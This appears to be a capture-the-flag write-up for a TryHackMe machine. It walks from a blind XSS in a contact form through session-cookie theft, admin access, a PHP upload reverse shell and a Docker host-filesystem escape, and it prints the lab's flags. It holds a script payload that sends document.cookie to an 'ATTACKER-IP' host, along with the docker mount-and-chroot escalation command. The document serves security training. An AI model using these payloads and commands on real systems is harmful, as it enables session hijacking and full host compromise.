# TryHackMe — Review / Sequence

> **Platform:** TryHackMe
> **Difficulty:** Medium
> **Category:** Web / Docker / Privilege Escalation
> **Target:** Review Shop
> **Operating System:** Linux
> **Primary Techniques:** Enumeration · Web Enumeration · Blind XSS · Session Hijacking · Admin Access · Internal Application Access · File Upload · Reverse Shell · Docker Privilege Escalation

---

## Overview

**Review / Sequence** is a medium-difficulty TryHackMe challenge focused on chaining multiple web vulnerabilities together to obtain administrative access, compromise an internal application, gain a shell inside a Docker environment, and finally escape the container to obtain **root access on the underlying host**.

The overall attack path can be summarized as:

```text
Web Enumeration
      │
      ▼
Blind XSS
      │
      ▼
Session Cookie Theft
      │
      ▼
Authenticated User Access
      │
      ▼
Chat / Admin Interaction
      │
      ▼
Admin Access Token
      │
      ▼
Internal Finance Application
      │
      ▼
File Upload
      │
      ▼
Reverse Shell
      │
      ▼
Docker Container
      │
      ▼
Docker Privilege Escalation
      │
      ▼
Root Access
```

---

# 1. Target Information

The initial target IP documented in the notes is:

```text
10.49.74.64
```

During service enumeration, the Nmap output identifies the target as:

```text
10.49.168.150
```

> **Note:** The original notes contain both addresses. The writeup preserves the values as recorded rather than assuming which address is correct.

---

# 2. Initial Enumeration

As always, the first step is to identify the exposed attack surface.

## Port Scan

```bash
nmap -sC -sV <TARGET>
```

The scan revealed two primary open services:

| Port     | Service | Version       |
| -------- | ------- | ------------- |
| `22/tcp` | SSH     | OpenSSH 8.2p1 |
| `80/tcp` | HTTP    | Apache 2.4.41 |

The HTTP service identified the application as:

```text
Review Shop
```

The target was running Ubuntu Linux.

### Interesting HTTP Details

```text
Apache/2.4.41 (Ubuntu)
PHPSESSID cookie
HttpOnly flag not set
```

The missing `HttpOnly` attribute on `PHPSESSID` was particularly interesting because it meant that JavaScript could potentially access the session cookie.

---

# 3. Web Enumeration

With HTTP exposed on port 80, the next step was directory and file enumeration.

## Gobuster

```bash
gobuster dir \
-u http://<TARGET>/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

Several interesting endpoints were discovered:

```text
/index.php
/login.php
/contact.php
/header.php
/logout.php
/db.php
/chat.php
/settings.php
/new.html
/dashboard.php
/user.png
/update_password.php
```

Several endpoints redirected to the login page, indicating that authentication was protecting portions of the application.

Further enumeration using the hostname revealed additional paths:

```text
/javascript
/mail
/phpmyadmin
/uploads
/server-status
```

The `/mail` directory immediately stood out because internal communication could potentially reveal useful information about the application's architecture.

---

# 4. Internal Mail Discovery

Inside the mail application, an interesting message was discovered.

```text
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment
```

The message revealed the existence of two internal panels:

```text
/finance.php
/lottery.php
```

The mail indicated that both applications were located on an internal `192.x` network.

It also referenced an eight-character alphanumeric password protecting the internal functionality.

### Why This Matters

At this stage, the application architecture started becoming clearer:

```text
Public Web Application
        │
        ├── Review Shop
        │
        ├── Mail
        │
        └── Authenticated Features
                │
                ├── Finance
                └── Lottery
```

The internal network information suggested that additional functionality might only become accessible after obtaining authenticated access.

---

# 5. Blind XSS — `/contact.php`

The `/contact.php` endpoint provided another important attack surface.

The contact functionality was vulnerable to **Blind Cross-Site Scripting (Blind XSS)**.

A JavaScript payload was used to demonstrate that the application could execute attacker-controlled JavaScript in another user's browser.

```html
<script>
var img = new Image();
img.src = 'http://ATTACKER-IP/stealcookies?' + document.cookie;
</script>
```

The objective was to determine whether a privileged user would execute the payload.

---

# 6. Capturing the Session Cookie

A simple HTTP server was started to receive the request:

```bash
python3 -m http.server 80
```

The callback revealed the PHP session identifier:

```text
GET /stealcookies?PHPSESSID=32mcfti86bok0vqi1o7n0kjae4
```

This confirmed that the Blind XSS vulnerability could be used to obtain a user's session cookie.

### Vulnerability Chain

```text
Contact Form
     │
     ▼
Stored / Blind XSS
     │
     ▼
Privileged User Opens Content
     │
     ▼
JavaScript Executes
     │
     ▼
document.cookie
     │
     ▼
PHPSESSID Obtained
     │
     ▼
Authenticated Session
```

This resulted in the first flag:

```text
THM{M0dH@*}
```

---

# 7. Escalating Web Privileges

After obtaining authenticated access, the next objective was to identify functionality available to privileged users.

The application contained a chat feature:

```text
/chat.php
```

The chat functionality contained input validation, but the application allowed links to be submitted for review.

The review panel could therefore be supplied directly to the administrator.

This created another opportunity for client-side execution against a privileged account.

The resulting interaction provided an **administrator access token**, leading to the administrator-level flag:

```text
THM{adm/**}
```

> **Key lesson:** A vulnerability does not always need to provide direct administrative access. In real-world applications, chaining a lower-privileged vulnerability with an administrative review workflow can produce a much more serious impact.

---

# 8. Administrator Account

After obtaining administrator-level access, the application required another login.

Once authenticated as the administrator, additional functionality became available.

One of the important actions was changing the administrator password.

This provided a more persistent authenticated foothold into the application.

---

# 9. Accessing the Internal Finance Application

Earlier reconnaissance had revealed:

```text
/finance.php
/lottery.php
```

These applications were hosted on an internal network.

The previously discovered mail message contained information indicating that the Finance panel was protected by a password.

Using the authenticated application flow and intercepting the relevant request with **Burp Suite**, the internal functionality could be reached.

The internal Finance application then exposed a file-upload feature.

---

# 10. File Upload Vulnerability

The Finance application contained functionality allowing files to be uploaded.

This became the next major step in the attack chain.

A PHP payload was uploaded:

```text
rev.php
```

The application confirmed:

```text
File uploaded successfully

File Name: rev.php
Path: uploads/rev.php
Type: application/x-php
```

At this point, we had successfully placed a PHP file on the internal application.

---

# 11. Triggering the Uploaded Payload

Initially, the uploaded file was expected to appear under the previously discovered public `/uploads` directory.

However, the Finance application was running on a **separate system**, meaning the upload location belonged to the internal application rather than the publicly accessible web server.

Burp Suite was therefore used to modify the relevant request.

The important parameter was:

```text
feature=/uploads/payload.php
```

The request was modified so that the application would reference the uploaded PHP payload.

This caused the server to execute the uploaded file.

---

# 12. Reverse Shell

The payload resulted in a reverse shell connection back to the attacker.

After receiving the shell, the current identity was checked:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Although the shell reported `root`, this was **root inside the Docker container**, not necessarily root on the underlying host.

This distinction is critical when working with containerized environments.

---

# 13. Stabilizing the Shell

Python was available inside the container:

```bash
which python3
```

Result:

```text
/usr/bin/python3
```

A more usable shell was spawned with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The terminal was then stabilized:

```bash
stty raw -echo
fg
```

And the terminal environment was configured:

```bash
export TERM=xterm-256color
```

We now had a much more functional shell inside the container.

---

# 14. Docker Enumeration

Because the shell was running inside a container, the next logical step was to determine whether Docker was accessible from within the environment.

```bash
docker images
```

The command returned:

```text
REPOSITORY      TAG         IMAGE ID       CREATED         SIZE
phpvulnerable   latest      d0bf58293d3b   14 months ago  926MB
php             8.1-cli     0ead645a9bc2   17 months ago  527MB
```

The presence of Docker functionality from inside the compromised environment was a major finding.

---

# 15. Docker Privilege Escalation

The Docker environment could be abused to mount the host filesystem into a new container.

The following command was used:

```bash
docker run -v /:/mnt --rm -it php:8.1-cli chroot /mnt sh
```

The important part is:

```text
-v /:/mnt
```

This mounts the host's root filesystem into `/mnt` inside the newly created container.

The `chroot` then changes the apparent root directory to the mounted filesystem:

```text
chroot /mnt
```

This effectively provided access to the host filesystem with root privileges.

---

# 16. Confirming Root Access

After entering the mounted filesystem:

```bash
id
```

returned:

```text
uid=0(root) gid=0(root) groups=0(root)
```

At this point, root access to the underlying filesystem had been achieved.

The root flag was then retrieved:

```bash
cat /root/flag.txt
```

Result:

```text
THM{rootAccessD0n3}
```

---

# 17. Complete Attack Chain

The complete compromise can be represented as:

```text
┌─────────────────────────────┐
│       Port Enumeration      │
│       22 / 80 exposed       │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│      Web Enumeration        │
│ login / chat / contact /    │
│ mail / internal endpoints   │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│        Blind XSS            │
│       /contact.php          │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│     Session Cookie Theft    │
│        PHPSESSID            │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│       Authenticated         │
│          Access             │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│      Admin Interaction      │
│        /chat.php            │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│       Admin Access          │
│        Access Token         │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│    Internal Finance App     │
│        192.x network        │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│       File Upload           │
│        PHP payload          │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│       Reverse Shell         │
│       Docker container      │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│      Docker Abuse           │
│       Host FS mounted       │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│       ROOT ACCESS           │
│   THM{rootAccessD0n3}       │
└─────────────────────────────┘
```

---

# 18. Flags

| Stage         | Flag                  |
| ------------- | --------------------- |
| Web / User    | `THM{M0dH@*}`         |
| Administrator | `THM{adm/**}`         |
| Root          | `THM{rootAccessD0n3}` |

---

# 19. Key Takeaways

### Web Enumeration

Directory and file enumeration exposed functionality that was not immediately visible through the main application.

### Blind XSS

Blind XSS can become significantly more dangerous when administrators or privileged users interact with attacker-controlled content.

### Session Security

The `PHPSESSID` cookie lacked the `HttpOnly` attribute, allowing JavaScript to access it.

### Trust Boundaries

The application trusted links and content submitted through user-facing functionality, creating an opportunity to attack privileged users.

### Internal Applications

Information disclosed through internal mail exposed applications that were otherwise inaccessible from the external network.

### File Upload Security

Allowing executable PHP files to be uploaded created a direct path to code execution.

### Containers Are Not Automatically Security Boundaries

Obtaining root inside a container does **not** automatically mean host compromise.

However, access to the Docker daemon or equivalent privileged container capabilities can completely change the situation.

### Docker Privilege Escalation

The ability to mount the host filesystem:

```bash
-v /:/mnt
```

combined with:

```bash
chroot /mnt
```

allowed root-level access to the underlying filesystem.

---

# 20. Final Thoughts

This machine is a good example of why individual vulnerabilities should not always be analyzed in isolation.

The initial Blind XSS did not immediately provide root access.

Instead, the compromise developed through several stages:

```text
Blind XSS
   ↓
Session Theft
   ↓
Authenticated Access
   ↓
Admin Interaction
   ↓
Internal Application
   ↓
File Upload
   ↓
Code Execution
   ↓
Docker Access
   ↓
Host Filesystem
   ↓
Root
```

The most important lesson is the **chaining of vulnerabilities and trust relationships**.

A low-severity issue at one stage can become critical when it is combined with another weakness elsewhere in the application.

---

## Tools Used

```text
Nmap
Gobuster
Burp Suite
Python
Netcat
```

---

## Disclaimer

This writeup is intended for **authorized security training and educational purposes**. The techniques demonstrated here should only be used against systems for which you have explicit permission to test.

---

### Author

**Kabir**

Cybersecurity | Red Teaming | Web Security

> Learn the vulnerability. Understand the chain. Master the methodology.
